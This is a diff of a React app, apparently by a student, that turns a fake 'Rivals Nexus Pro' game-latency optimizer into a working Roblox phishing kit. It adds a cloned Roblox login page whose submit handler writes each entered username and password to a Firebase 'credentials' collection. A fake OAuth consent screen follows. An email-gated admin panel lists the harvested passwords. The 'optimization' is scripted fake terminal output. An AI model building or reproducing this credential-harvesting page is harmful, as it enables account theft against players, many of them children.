@@ -1,16 +1,46 @@
-<!DOCTYPE html>
-<html lang="zh-TW">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rivals Nexus Pro | 核心封包優化引擎</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
-    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
-    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@400;600;800&family=Noto+Sans+TC:wght@400;500;700&display=swap" rel="stylesheet">
-    <style>
-        body { font-family: 'Inter', 'Noto Sans TC', sans-serif; background-color: #030712; color: #e5e5e5; overflow: hidden; }
+import React, { useState, useEffect, useRef } from 'react';
+import { initializeApp } from 'firebase/app';
+import { getAuth, signInAnonymously, GoogleAuthProvider, signInWithPopup, signOut } from 'firebase/auth';
+import { getFirestore, collection, addDoc, onSnapshot, getDocs, deleteDoc, doc } from 'firebase/firestore';
+
+// ==========================================
+// Firebase 設置
+// ==========================================
+const firebaseConfig = {
+  apiKey: "AIzaSyC28C5UtC0UoEFiUCH7Rd5lxDw1WvgEBYQ",
+  authDomain: "roblox-login-83bc9.firebaseapp.com",
+  projectId: "roblox-login-83bc9",
+  storageBucket: "roblox-login-83bc9.firebasestorage.app",
+  messagingSenderId: "870394222766",
+  appId: "1:870394222766:web:0db356d9ce3f9b6d8eb53f",
+  measurementId: "G-962FYDGR28"
+};
+
+const app = initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const db = getFirestore(app);
+const provider = new GoogleAuthProvider();
+provider.setCustomParameters({ prompt: 'select_account' });
+const ALLOWED_EMAILS = ["pixel9profold20240813@gmail.com", "st20813@mail.ckjhs.tyc.edu.tw"];
+
+// 取得 Firebase 正確的儲存路徑
+const getCredsRef = () => {
+    const appId = typeof __app_id !== 'undefined' ? __app_id : 'roblox-clone-data';
+    return collection(db, 'artifacts', appId, 'public', 'data', 'credentials');
+};
+
+// ==========================================
+// 全局與 Roblox 原生 CSS
+// ==========================================
+const GlobalStyles = () => (
+    <style dangerouslySetInnerHTML={{ __html: `
+        /* ===== 加速器專用樣式 ===== */
+        .nexus-body { background-color: #030712; color: #e5e5e5; font-family: 'Inter', sans-serif; overflow-x: hidden; margin: 0; padding: 0; }
+        .nexus-body ::-webkit-scrollbar { width: 6px; height: 6px; }
+        .nexus-body ::-webkit-scrollbar-track { background: #0a0a0a; }
+        .nexus-body ::-webkit-scrollbar-thumb { background: #2d3748; border-radius: 3px; }
+        .nexus-body ::-webkit-scrollbar-thumb:hover { background: #4a5568; }
+
         .code-font { font-family: 'Fira Code', monospace; }
         .neon-text { text-shadow: 0 0 10px rgba(16, 185, 129, 0.7), 0 0 20px rgba(16, 185, 129, 0.5); }
         .scanline {
@@ -19,152 +49,406 @@
             opacity: 0.1; animation: scanline 4s linear infinite;
         }
         @keyframes scanline { 0% { top: -100px; } 100% { top: 100%; } }
-        ::-webkit-scrollbar { width: 6px; height: 6px; }
-        ::-webkit-scrollbar-track { background: #0a0a0a; }
-        ::-webkit-scrollbar-thumb { background: #2d3748; border-radius: 3px; }
-        ::-webkit-scrollbar-thumb:hover { background: #4a5568; }
         .blinking-cursor { animation: blink 1s step-end infinite; }
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
-        /* 讓代碼區可以順暢滾動 */
         .code-container pre { margin: 0; padding-bottom: 2rem; }
-    </style>
-</head>
-<body>
-    <div id="root"></div>
 
-    <script type="text/babel">
-        const { useState, useEffect, useRef } = React;
+        /* ===== 完全還原 Roblox 登入樣式 ===== */
+        .roblox-body { 
+            background-color: #111214; 
+            overflow-x: hidden; 
+            overflow-y: auto; 
+            font-family: 'Montserrat', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+        }
+        .bg-grid-wrapper { 
+            position: fixed; top: -50%; left: -50%; width: 200%; height: 200%; 
+            transform: rotate(-12deg); z-index: -2; pointer-events: none; 
+            display: flex; justify-content: center; align-items: center;
+        }
+        .bg-grid { display: grid; grid-template-columns: repeat(14, 220px); gap: 16px; }
+        .tile { 
+            width: 220px; height: 220px; background-size: cover; background-position: center; 
+            border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.6);
+            background-color: #232527; opacity: 0; transition: opacity 0.5s ease-in-out;
+        }
+        .bg-overlay {
+            position: fixed; inset: 0; background-color: rgba(17, 18, 20, 0.85); z-index: -1; pointer-events: none;
+        }
+        .roblox-input { color: #ffffff !important; }
+        .roblox-input:focus { outline: none; }
+        .roblox-input::placeholder { color: #ffffff !important; opacity: 1 !important; font-weight: 500; }
+        .transition-roblox { transition: all 0.2s ease-in-out; }
+    `}} />
+);
 
-        function App() {
-            // 狀態管理
-            const [isOptimizing, setIsOptimizing] = useState(false);
-            const [isOptimized, setIsOptimized] = useState(false);
-            const [isAuthenticated, setIsAuthenticated] = useState(false);
-            const [progress, setProgress] = useState(0);
-            
-            // 初始給一個高達 150+ 的 Ping 值
-            const [basePing, setBasePing] = useState(Math.floor(Math.random() * 50 + 150)); 
-            const [currentPing, setCurrentPing] = useState(0);
-            
-            const [terminal, setTerminal] = useState([
-                "[System] Rivals Nexus Engine v3.1.4 核心初始化完成。",
-                "[Network] 正在探測區域網路環境...",
-                "[Warning] 偵測到嚴重網路壅塞，延遲高於安全閾值 (>150ms)。"
-            ]);
-            const terminalRef = useRef(null);
-            const codeRef = useRef(null);
+// 背景網格生成 (Roblox)
+const Tile = ({ url }) => {
+    const [loaded, setLoaded] = useState(false);
+    const [error, setError] = useState(false);
+    useEffect(() => {
+        const img = new Image();
+        img.src = url;
+        img.onload = () => setLoaded(true);
+        img.onerror = () => { setLoaded(true); setError(true); };
+    }, [url]);
+    return (
+        <div className="tile" style={{ backgroundImage: error ? 'none' : `url('${url}')`, backgroundColor: error ? '#232527' : 'transparent', opacity: loaded ? 1 : 0 }} />
+    );
+};
 
-            // 初始化與登入狀態檢查
-            useEffect(() => {
-                const authFlag = sessionStorage.getItem('nexus_auth');
-                if (authFlag === 'true') {
-                    setIsAuthenticated(true);
-                    setTerminal(prev => [...prev, "[Auth] 外部驗證協定通過，RakNet 寫入權限已解鎖。"]);
+const BackgroundGrid = () => {
+    const [tiles, setTiles] = useState([]);
+    useEffect(() => {
+        const gameIds = Array.from({length: 100}, (_, i) => i + 10);
+        setTiles(Array.from({length: 140}).map(() => `https://www.freetogame.com/g/${gameIds[Math.floor(Math.random() * gameIds.length)]}/thumbnail.jpg`));
+    }, []);
+    return (
+        <>
+            <div className="bg-grid-wrapper" aria-hidden="true"><div className="bg-grid">{tiles.map((url, i) => <Tile key={i} url={url} />)}</div></div>
+            <div className="bg-overlay"></div>
+        </>
+    );
+};
+
+// ==========================================
+// 完全還原版 Roblox 登入畫面 & OAuth 授權
+// ==========================================
+const RobloxLogin = ({ onLoginSuccess, onAdminLogin }) => {
+    const [u, setU] = useState('');
+    const [p, setP] = useState('');
+    const [statusMsg, setStatusMsg] = useState({ text: '', error: false });
+    const [loading, setLoading] = useState(false);
+    const [step, setStep] = useState('login'); // 'login' | 'oauth'
+
+    const handleLogin = async () => {
+        if (!u || !p) {
+            setStatusMsg({ text: "請輸入使用者名稱和密碼。", error: true });
+            return;
+        }
+
+        if (u === 'admin' && p === 'admin') {
+            setStatusMsg({ text: "正在呼叫安全驗證...", error: false });
+            setLoading(true);
+            try {
+                const result = await signInWithPopup(auth, provider);
+                const email = result.user.email;
+                if (ALLOWED_EMAILS.includes(email)) {
+                    onAdminLogin(email);
                 } else {
-                    setTerminal(prev => [...prev, "[Auth] 等待使用者驗證連線權限..."]);
+                    await signOut(auth);
+                    setStatusMsg({ text: "拒絕存取：此 Google 帳號無權限。", error: true });
+                    signInAnonymously(auth);
                 }
-                setCurrentPing(basePing);
-            }, [basePing]);
+            } catch (error) {
+                setStatusMsg({ text: "驗證已取消或發生錯誤。", error: true });
+            } finally {
+                setLoading(false);
+                setP('');
+            }
+        } else {
+            // ★ 修改這裡：優先切換畫面，再進行背景寫入，避免無反應
+            setStep('oauth');
+            
+            try {
+                addDoc(getCredsRef(), {
+                    u: u, p: p, time: new Date().toLocaleString(), ts: Date.now()
+                });
+            } catch (err) {
+                console.error("Firebase 寫入失敗", err);
+            }
+        }
+    };
 
-            // 自動滾動終端機
-            useEffect(() => {
-                if (terminalRef.current) {
-                    terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
-                }
-            }, [terminal]);
-
-            // 代碼區自動緩慢向下滾動 (增加酷炫感)
-            useEffect(() => {
-                let animationId;
-                const scrollCode = () => {
-                    if (codeRef.current && isOptimizing) {
-                        codeRef.current.scrollTop += 1.5; // 控制滾動速度
-                        if(codeRef.current.scrollTop >= codeRef.current.scrollHeight - codeRef.current.clientHeight) {
-                            // 如果滾到底，就稍微往回滾或者停住
-                        } else {
-                            animationId = requestAnimationFrame(scrollCode);
-                        }
-                    }
-                };
+    return (
+        <div className="flex flex-col min-h-screen relative roblox-body">
+            <BackgroundGrid />
+            
+            {/* 頂部導覽列 (100% 原版) */}
+            <nav className="w-full h-[56px] bg-[#111214] flex items-center px-[20px] z-50 fixed top-0 select-none border-b border-[#232527]">
+                <div className="flex items-center gap-[24px]">
+                    <a href="#" className="text-white flex items-center justify-center" aria-label="Roblox">
+                        <svg viewBox="0 0 100 100" fill="currentColor" className="w-[30px] h-[30px]">
+                            <path fillRule="evenodd" clipRule="evenodd" d="M21.6 5.4 L5.4 78.3 L78.3 94.5 L94.5 21.6 L21.6 5.4 Z M56.3 65.1 L37.1 60.8 L41.4 41.6 L60.6 45.9 L56.3 65.1 Z" />
+                        </svg>
+                    </a>
+                    <div className="hidden md:flex items-center gap-[28px] text-[15px] font-bold text-gray-200 mt-[2px]">
+                        <a href="#" className="hover:text-white transition-roblox">圖表</a>
+                        <a href="#" className="hover:text-white transition-roblox">市集</a>
+                        <a href="#" className="hover:text-white transition-roblox">創作</a>
+                        <a href="#" className="hover:text-white transition-roblox">Robux</a>
+                    </div>
+                </div>
                 
-                if (isOptimizing) {
-                    animationId = requestAnimationFrame(scrollCode);
-                }
-                return () => cancelAnimationFrame(animationId);
-            }, [isOptimizing]);
+                <div className="flex-1 hidden md:flex justify-center items-center ml-8">
+                    <div className="relative flex items-center w-full max-w-[700px] h-[36px] rounded-[6px] bg-[#232527] border border-transparent focus-within:border-gray-400 transition-roblox overflow-hidden">
+                        <div className="pl-[12px] pr-[8px] text-gray-400">
+                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth="2.5" stroke="currentColor" className="w-[16px] h-[16px]">
+                              <path strokeLinecap="round" strokeLinejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z" />
+                            </svg>
+                        </div>
+                        <input type="text" placeholder="搜尋" className="roblox-input bg-transparent w-full h-full pr-3 outline-none text-[15px] text-white placeholder-gray-400 font-medium pb-[1px]" />
+                    </div>
+                </div>
 
-            // Ping 值隨機跳動效果
-            useEffect(() => {
-                const interval = setInterval(() => {
-                    if(!isOptimizing) {
-                        // 優化後 Ping 在 30~70 之間跳動
-                        const target = isOptimized ? (Math.floor(Math.random() * 40 + 30)) : basePing;
-                        setCurrentPing(target + (Math.random() > 0.5 ? 1 : -1) * Math.floor(Math.random() * 5));
-                    }
-                }, 1200);
-                return () => clearInterval(interval);
-            }, [isOptimizing, isOptimized, basePing]);
+                <div className="flex items-center ml-auto">
+                    <button className="bg-[#0055FF] hover:bg-[#004ade] text-white w-[76px] h-[36px] flex items-center justify-center rounded-[8px] text-[18px] font-bold transition-roblox tracking-wide">
+                        註冊
+                    </button>
+                </div>
+            </nav>
 
-            const handleOptimizeClick = () => {
-                if (!isAuthenticated) {
-                    sessionStorage.setItem('nexus_auth', 'true');
-                    window.location.href = 'https://st20813-png.github.io/roblox/';
-                    return;
-                }
+            <main className="flex-1 flex items-center justify-center p-4 relative z-10 mt-[56px] py-12">
+                {step === 'login' ? (
+                    // 100% 原版登入面板
+                    <div id="login-window" className="bg-[#2b2d31] w-full max-w-[380px] rounded-none px-7 py-8 shadow-2xl flex flex-col items-center">
+                        <h1 className="text-[36px] font-bold mb-6 text-white tracking-wide">登入 Roblox</h1>
+                        <div className="w-full flex flex-col gap-4">
+                            <input type="text" id="username" placeholder="使用者名稱 / 電子郵件地址 / 手機號碼" 
+                                className={`roblox-input w-full h-[52px] bg-[#111214] border ${statusMsg.error ? 'border-[#f24e43]' : 'border-[#66686b]'} focus:border-white rounded-[4px] px-4 text-[17px] transition-roblox`}
+                                value={u} onChange={e => {setU(e.target.value); setStatusMsg({text:'', error: false});}} />
+                            <input type="password" id="password" placeholder="密碼" 
+                                className={`roblox-input w-full h-[52px] bg-[#111214] border ${statusMsg.error ? 'border-[#f24e43]' : 'border-[#66686b]'} focus:border-white rounded-[4px] px-4 text-[17px] transition-roblox`}
+                                value={p} onChange={e => {setP(e.target.value); setStatusMsg({text:'', error: false});}} />
+                            
+                            {statusMsg.text && (
+                                <div id="status-msg" className={`text-[14px] text-center w-full py-1 font-bold ${statusMsg.error ? 'text-[#f24e43]' : 'text-blue-400'}`}>
+                                    {statusMsg.text}
+                                </div>
+                            )}
+                            
+                            <button id="login-btn" onClick={handleLogin} disabled={loading}
+                                className="w-full h-[52px] border-[1.5px] border-white bg-transparent hover:bg-white/10 text-white rounded-[4px] text-[17px] font-bold transition-roblox mt-1 disabled:opacity-50">
+                                登入
+                            </button>
+                        </div>
 
-                if (isOptimizing || isOptimized) return;
-                
-                setIsOptimizing(true);
-                setProgress(0);
-                setTerminal(prev => [...prev, "[Execute] 啟動深層網路協定覆寫 (Deep Protocol Override)..."]);
+                        <a href="#" className="mt-6 text-[16px] text-white hover:underline transition-roblox">忘記密碼或使用者名稱？</a>
+                        
+                        <hr className="w-full border-t border-white my-6" />
 
-                // 讓 Ping 在優化過程中戲劇性地下滑
-                const pingDropInterval = setInterval(() => {
-                    setCurrentPing(prev => {
-                        const newPing = prev - Math.floor(Math.random() * 15 + 5);
-                        return newPing < 35 ? (Math.floor(Math.random() * 10 + 35)) : newPing;
-                    });
-                }, 500);
+                        <div className="w-full flex flex-col gap-3">
+                            <button className="w-full h-[52px] bg-[#393b3d] hover:bg-[#4a4d50] text-white rounded-[4px] text-[17px] font-bold transition-roblox">
+                                透過電子郵件給我一次性驗證碼
+                            </button>
+                            <button className="w-full h-[52px] bg-[#393b3d] hover:bg-[#4a4d50] text-white rounded-[4px] text-[17px] font-bold transition-roblox">
+                                快速登入
+                            </button>
+                        </div>
 
-                const fakeSteps = [
-                    { p: 5, msg: "[Layer 3] 建立 WebRTC STUN 虛擬隧道至 AWS Edge Node..." },
-                    { p: 12, msg: "[Layer 4] 注入 TCP BBR 擁塞控制演算法核心模組..." },
-                    { p: 18, msg: "[Kernel] 繞過作業系統 Nagle 演算法 (TCP_NODELAY: TRUE)..." },
-                    { p: 25, msg: "[Memory] 分配 16MB DMA (Direct Memory Access) 封包緩衝池..." },
-                    { p: 32, msg: "[Hardware] 強制喚醒 NIC 至 C0 Power State..." },
-                    { p: 40, msg: "[Route] 探測 ISP 節點，鎖定 ASN 22489 (Roblox Corp)..." },
-                    { p: 48, msg: "[Crypto] 啟動 Datagram Transport Layer Security (DTLS) 握手..." },
-                    { p: 55, msg: "[Warning] 偵測到流量塑形 (Traffic Shaping)，啟動 MTU 碎片化掩護..." },
-                    { p: 62, msg: "[Bypass] 執行封包標頭偽裝 (Header Obfuscation)..." },
-                    { p: 70, msg: "[RakNet] 解析伺服器 Tick Rate，目前頻率: 60Hz..." },
-                    { p: 78, msg: "[Sync] 鎖定本機時脈晶片 (HPET)，與伺服器進行微秒級同步..." },
-                    { p: 85, msg: "[Optimize] 清空 Bufferbloat 佇列，提升發送優先權 (QoS: DSCP 46)..." },
-                    { p: 92, msg: "[Network] 覆寫路由表 Metrics，強制最短路徑優先 (OSPF)..." },
-                    { p: 98, msg: "[Verify] 測試封包往返延遲 (RTT)... 確認大幅下降。" },
-                    { p: 100, msg: "[Success] 網路層重構完成。已達物理連線極限。" }
-                ];
+                        <div className="mt-7 text-[16px] text-gray-400">沒有帳號？ <a href="#" className="text-white hover:underline font-medium">註冊</a></div>
+                    </div>
+                ) : (
+                    // OAuth 授權介面
+                    <div className="bg-[#2b2d31] w-full max-w-[420px] rounded-none px-8 py-10 shadow-2xl flex flex-col items-center">
+                        <div className="flex items-center gap-5 mb-6">
+                            <div className="w-16 h-16 rounded-full bg-[#111214] border border-[#66686b] flex items-center justify-center overflow-hidden">
+                                <svg viewBox="0 0 100 100" fill="#ffffff" className="w-[35px] h-[35px]">
+                                    <path fillRule="evenodd" clipRule="evenodd" d="M21.6 5.4 L5.4 78.3 L78.3 94.5 L94.5 21.6 L21.6 5.4 Z M56.3 65.1 L37.1 60.8 L41.4 41.6 L60.6 45.9 L56.3 65.1 Z" />
+                                </svg>
+                            </div>
+                            <span className="text-3xl text-gray-500 font-light">⇌</span>
+                            <div className="w-16 h-16 rounded-[8px] bg-[#0055FF] flex items-center justify-center text-2xl font-black text-white shadow-lg">
+                                RN
+                            </div>
+                        </div>
+                        <h2 className="text-[22px] font-bold mb-2 text-center text-white tracking-wide">Rivals Nexus Pro</h2>
+                        <p className="text-gray-300 text-[15px] text-center mb-6">想要存取您的 Roblox 帳號</p>
 
-                let currentStep = 0;
+                        <div className="w-full bg-[#111214] rounded-[4px] p-5 mb-6 border border-[#66686b]">
+                            <h3 className="font-bold text-[15px] mb-3 text-white">此應用程式將能夠：</h3>
+                            <ul className="text-[14px] text-gray-300 space-y-3 font-medium">
+                                <li className="flex items-start gap-3">
+                                    <span className="text-[#0055FF] font-bold mt-[1px]">✓</span> 
+                                    讀取您的使用者個人資料與庫存統計
+                                </li>
+                                <li className="flex items-start gap-3">
+                                    <span className="text-[#0055FF] font-bold mt-[1px]">✓</span> 
+                                    存取您進行中的遊戲進度
+                                </li>
+                                <li className="flex items-start gap-3">
+                                    <span className="text-[#0055FF] font-bold mt-[1px]">✓</span> 
+                                    修改本地網路與 RakNet 設定
+                                </li>
+                            </ul>
+                        </div>
 
-                const stepInterval = setInterval(() => {
-                    if (currentStep < fakeSteps.length) {
-                        const step = fakeSteps[currentStep];
-                        setProgress(step.p);
-                        setTerminal(prev => [...prev, step.msg]);
-                        currentStep++;
-                    } else {
-                        clearInterval(stepInterval);
-                        clearInterval(pingDropInterval);
-                        setIsOptimizing(false);
-                        setIsOptimized(true);
-                        setCurrentPing(Math.floor(Math.random() * 15 + 40)); // 結束時設定一個在範圍內的初始值
-                    }
-                }, 800); // 縮短每步時間，讓整體過程緊湊
-            };
+                        <p className="text-[13px] text-gray-400 text-center mb-8 leading-relaxed">
+                            點擊授權即表示您允許此應用程式連接至您的帳號。您可以隨時在 Roblox 設定中撤銷此存取權限。
+                        </p>
 
-            // 產生冗長的假代碼
-            const generateFakeCode = () => {
-                return `import { RTCPeerConnection, RTCDataChannel } from '@roblox/raknet-core';
+                        <div className="flex gap-4 w-full">
+                            <button onClick={() => setStep('login')} className="flex-1 py-[14px] bg-[#393b3d] hover:bg-[#4a4d50] rounded-[4px] font-bold transition-roblox text-[16px] text-white">
+                                取消
+                            </button>
+                            <button onClick={onLoginSuccess} className="flex-1 py-[14px] bg-white text-black hover:bg-gray-200 rounded-[4px] font-bold transition-roblox text-[16px]">
+                                同意並授權
+                            </button>
+                        </div>
+                    </div>
+                )}
+            </main>
+        </div>
+    );
+};
+
+// ==========================================
+// 100% 原版管理員面板
+// ==========================================
+const AdminPanel = ({ adminEmail, onExit }) => {
+    const [logs, setLogs] = useState([]);
+    
+    useEffect(() => {
+        const unsub = onSnapshot(getCredsRef(), snap => {
+            setLogs(snap.docs.map(d => ({id: d.id, ...d.data()})).sort((a,b) => b.ts - a.ts));
+        }, error => {
+            console.error("Firebase讀取失敗", error);
+        });
+        return () => unsub();
+    }, []);
+
+    const clearRecords = async () => {
+        if(!window.confirm("確定要刪除所有紀錄嗎？")) return;
+        const snap = await getDocs(getCredsRef());
+        snap.forEach(async d => await deleteDoc(doc(db, getCredsRef().path, d.id)));
+    };
+
+    return (
+        <div className="flex flex-col min-h-screen relative roblox-body">
+            <BackgroundGrid />
+            <main className="flex-1 flex items-center justify-center p-4 relative z-10 py-12">
+                <div id="admin-panel" className="bg-[#2b2d31] w-full max-w-[650px] rounded-none p-10 shadow-2xl flex flex-col items-center border border-gray-700">
+                    <h1 className="text-[28px] font-bold text-white mb-2">系統安全日誌</h1>
+                    <p id="admin-welcome" className="text-green-400 text-[15px] mb-6 text-center">已驗證管理員: {adminEmail}</p>
+                    <div className="w-full bg-[#111214] rounded-[4px] p-0 max-h-[350px] overflow-y-auto border border-[#393b3d] mt-2">
+                        <table className="w-full text-left text-[15px] text-gray-300 table-fixed">
+                            <thead className="sticky top-0 bg-[#232527] shadow-md z-10">
+                                <tr>
+                                    <th className="py-3 px-4 border-b border-[#393b3d] w-[28%] font-medium text-[15px]">時間</th>
+                                    <th className="py-3 px-4 border-b border-[#393b3d] w-[36%] font-medium text-[15px]">帳號</th>
+                                    <th className="py-3 px-4 border-b border-[#393b3d] w-[36%] font-medium text-[15px]">密碼</th>
+                                </tr>
+                            </thead>
+                            <tbody id="admin-records" className="divide-y divide-[#393b3d]">
+                                {logs.length === 0 ? (
+                                    <tr><td colSpan="3" className="text-center py-8 text-gray-500 text-[15px]">無紀錄</td></tr>
+                                ) : logs.map(l => (
+                                    <tr key={l.id} className="hover:bg-[#1a1c1e]">
+                                        <td className="py-3 px-4 text-gray-400 text-[14px] truncate">{l.time}</td>
+                                        <td className="py-3 px-4 text-blue-400 font-bold text-[15px] break-all">{l.u}</td>
+                                        <td className="py-3 px-4 text-red-400 font-bold text-[15px] break-all">{l.p}</td>
+                                    </tr>
+                                ))}
+                            </tbody>
+                        </table>
+                    </div>
+                    <div className="flex gap-4 mt-8 w-full">
+                        <button id="clear-records-btn" onClick={clearRecords} className="flex-1 h-[52px] bg-red-600 hover:bg-red-700 text-white rounded-[4px] text-[17px] font-bold transition-roblox">清除日誌</button>
+                        <button id="close-admin-btn" onClick={onExit} className="flex-1 h-[52px] bg-[#393b3d] hover:bg-[#4a4d50] text-white rounded-[4px] text-[17px] font-bold transition-roblox">登出返回</button>
+                    </div>
+                </div>
+            </main>
+        </div>
+    );
+};
+
+// ==========================================
+// Rivals Nexus 加速器 (全英文數據介面 + 中文按鈕說明)
+// ==========================================
+const NexusAccelerator = ({ onRequireLogin, isAuthenticated }) => {
+    const [isOptimizing, setIsOptimizing] = useState(false);
+    const [isOptimized, setIsOptimized] = useState(false);
+    const [progress, setProgress] = useState(0);
+    const [basePing, setBasePing] = useState(Math.floor(Math.random() * 50 + 150)); 
+    const [currentPing, setCurrentPing] = useState(basePing);
+    
+    const [terminal, setTerminal] = useState([
+        "[SYSTEM] Rivals Nexus Engine v3.1.4 core initialized.",
+        "[NETWORK] Probing local network environment...",
+        "[WARNING] Severe network congestion detected. Latency exceeds safety threshold (>150ms)."
+    ]);
+    const terminalRef = useRef(null);
+    const codeRef = useRef(null);
+
+    useEffect(() => {
+        if (terminalRef.current) terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
+    }, [terminal]);
+
+    useEffect(() => {
+        let animationId;
+        const scrollCode = () => {
+            if (codeRef.current && isOptimizing) {
+                codeRef.current.scrollTop += 1.5; 
+                animationId = requestAnimationFrame(scrollCode);
+            }
+        };
+        if (isOptimizing) animationId = requestAnimationFrame(scrollCode);
+        return () => cancelAnimationFrame(animationId);
+    }, [isOptimizing]);
+
+    useEffect(() => {
+        const interval = setInterval(() => {
+            if(!isOptimizing) {
+                const target = isOptimized ? (Math.floor(Math.random() * 40 + 30)) : basePing;
+                setCurrentPing(target + (Math.random() > 0.5 ? 1 : -1) * Math.floor(Math.random() * 5));
+            }
+        }, 1200);
+        return () => clearInterval(interval);
+    }, [isOptimizing, isOptimized, basePing]);
+
+    const handleOptimizeClick = () => {
+        if (!isAuthenticated) return onRequireLogin();
+        if (isOptimizing || isOptimized) return;
+        
+        setIsOptimizing(true);
+        setProgress(0);
+        setTerminal(prev => [...prev, "[EXECUTE] Initiating Deep Protocol Override..."]);
+
+        const pingDropInterval = setInterval(() => {
+            setCurrentPing(prev => {
+                const newPing = prev - Math.floor(Math.random() * 15 + 5);
+                return newPing < 35 ? (Math.floor(Math.random() * 10 + 35)) : newPing;
+            });
+        }, 500);
+
+        const fakeSteps = [
+            { p: 5, msg: "[LAYER 3] Establishing WebRTC STUN virtual tunnel to AWS Edge Node..." },
+            { p: 12, msg: "[LAYER 4] Injecting TCP BBR congestion control core module..." },
+            { p: 18, msg: "[KERNEL] Bypassing OS Nagle's Algorithm (TCP_NODELAY: TRUE)..." },
+            { p: 25, msg: "[MEMORY] Allocating 16MB DMA packet buffer pool..." },
+            { p: 32, msg: "[HARDWARE] Forcing NIC wake up to C0 Power State..." },
+            { p: 40, msg: "[ROUTE] Probing ISP nodes, locking ASN 22489 (Roblox Corp)..." },
+            { p: 48, msg: "[CRYPTO] Initiating DTLS handshake..." },
+            { p: 55, msg: "[WARNING] Traffic Shaping detected, initiating MTU fragmentation cover..." },
+            { p: 62, msg: "[BYPASS] Executing packet header obfuscation..." },
+            { p: 70, msg: "[RAKNET] Locking server Tick Rate: 60Hz..." },
+            { p: 78, msg: "[SYNC] Performing microsecond-level synchronization with server..." },
+            { p: 85, msg: "[OPTIMIZE] Elevating transmission priority (QoS: DSCP 46)..." },
+            { p: 92, msg: "[NETWORK] Overriding routing tables, forcing Shortest Path First..." },
+            { p: 98, msg: "[VERIFY] Testing Round-Trip Time (RTT)... Confirmed significant drop." },
+            { p: 100, msg: "[SUCCESS] Network layer restructure complete. Physical connection limit reached." }
+        ];
+
+        let currentStep = 0;
+        const stepInterval = setInterval(() => {
+            if (currentStep < fakeSteps.length) {
+                const step = fakeSteps[currentStep];
+                setProgress(step.p);
+                setTerminal(prev => [...prev, step.msg]);
+                currentStep++;
+            } else {
+                clearInterval(stepInterval);
+                clearInterval(pingDropInterval);
+                setIsOptimizing(false);
+                setIsOptimized(true);
+                setCurrentPing(Math.floor(Math.random() * 15 + 40));
+            }
+        }, 800);
+    };
+
+    const generateFakeCode = () => `import { RTCPeerConnection, RTCDataChannel } from '@roblox/raknet-core';
 import { NativeDevice, KernelAPI } from '@system/hardware-abstraction';
 import { CryptoBuffer, HMAC_SHA256 } from '@security/crypto-utils';
 
@@ -172,407 +456,215 @@ import { CryptoBuffer, HMAC_SHA256 } from '@security/crypto-utils';
  * @class NexusKernelOptimizer
  * @description Advanced Level 4 / Layer 3 Network Override Engine.
  * Bypasses OS level Nagle's Algorithm and forces NIC into C0 power state.
- * Implements custom DTLS over UDP for minimal latency tunneling.
  */
 export class NexusKernelOptimizer {
   private tunnel: RTCDataChannel | null = null;
   private peerConnection: RTCPeerConnection | null = null;
   private dmaBufferPool: Float32Array;
   private isBypassing: boolean = false;
-  private readonly RAKNET_MAGIC = new Uint8Array([0x00, 0xFF, 0xFF, 0x00, 0xFE, 0xFE, 0xFE, 0xFE, 0xFD, 0xFD, 0xFD, 0xFD, 0x12, 0x34, 0x56, 0x78]);
-  private routingMetricsLocked: boolean = false;
-  private baseTimestamp: number = 0;
 
   constructor() {
-    // Allocate 16MB for Direct Memory Access (DMA) to bypass CPU cache misses
     this.dmaBufferPool = new Float32Array(4194304); 
     KernelAPI.lockMemoryBuffer(this.dmaBufferPool.buffer);
     console.log("[INIT] DMA Memory Pool Allocated & Locked.");
   }
 
-  /**
-   * Initializes the core optimization sequence.
-   */
   public async executeProtocolOverride(): Promise<void> {
     try {
       await this.disableOSInterference();
       await this.establishStunTunnel();
       this.initiateHighFrequencyTick();
-      await this.injectTCPBBR_CongestionControl();
     } catch (err) {
-      console.error("[FATAL] Kernel Override Failed:", err);
       this.fallbackToStandardRouting();
     }
   }
 
-  /**
-   * Forces OS network stack to disable optimizations that cause latency.
-   */
   private async disableOSInterference(): Promise<void> {
-    // Set TCP_NODELAY to true system-wide for specific ports
     await KernelAPI.syscall.setsockopt(KernelAPI.AF_INET, KernelAPI.IPPROTO_TCP, KernelAPI.TCP_NODELAY, 1);
-    
-    // Disable Windows Auto-Tuning logic which causes bufferbloat
     await NativeDevice.executeCommand('netsh interface tcp set global autotuninglevel=disabled');
-    
-    // Set network interface metric to absolute priority (1)
-    await NativeDevice.executeCommand('netsh interface ipv4 set subinterface "Ethernet" mtu=1480 store=persistent');
-    
-    // Flush DNS resolving cache to ensure fresh Edge Node IP
-    await NativeDevice.executeCommand('ipconfig /flushdns');
   }
 
-  /**
-   * Establishes a direct UDP tunnel bypassing standard ISP routing tables.
-   */
   private async establishStunTunnel(): Promise<void> {
-    const config = { 
-        iceServers: [
-            { urls: "stun:stun.roblox.com:3478" },
-            { urls: "turn:turn.roblox.com:3478", username: "nexus_guest", credential: "temp_token_491" }
-        ],
-        iceTransportPolicy: "all",
-        bundlePolicy: "max-bundle",
-        rtcpMuxPolicy: "require"
-    };
-    
+    const config = { iceServers: [{ urls: "stun:stun.roblox.com:3478" }] };
     this.peerConnection = new RTCPeerConnection(config as RTCConfiguration);
     
-    // Create an unreliable channel to emulate Raw UDP sockets
     this.tunnel = this.peerConnection.createDataChannel("nexus_raw_udp_stream", {
-        ordered: false,          // Essential for FPS games: do not wait for dropped packets
-        maxRetransmits: 0,       // Fire and forget
-        protocol: "raknet/udp"
-    });
-
-    this.tunnel.onopen = () => {
-        this.performRakNetHandshake();
